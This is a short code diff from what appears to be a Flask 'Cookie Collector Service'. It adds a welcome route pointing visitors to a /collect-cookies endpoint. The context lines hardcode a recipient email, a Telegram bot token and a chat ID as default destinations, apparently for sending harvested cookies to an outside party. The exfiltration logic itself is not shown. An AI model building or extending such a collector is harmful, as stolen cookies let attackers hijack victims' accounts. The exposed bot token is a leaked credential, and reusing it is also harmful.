@@ -18,6 +18,10 @@ RECIPIENT_EMAIL = os.environ.get('RECIPIENT_EMAIL', 'w.sp4ce@yandex.com')
 TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '5444520238:AAHo9DY-sSdKi6wh36WEpTTLA2S5V6Pc5A8')
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '@blavkcap')
 
+@app.route('/')
+def index():
+    return "Welcome to the Cookie Collector Service. Use /collect-cookies to collect cookies."
+
 @app.route('/collect-cookies')
 def collect_cookies():
     all_cookies = {}
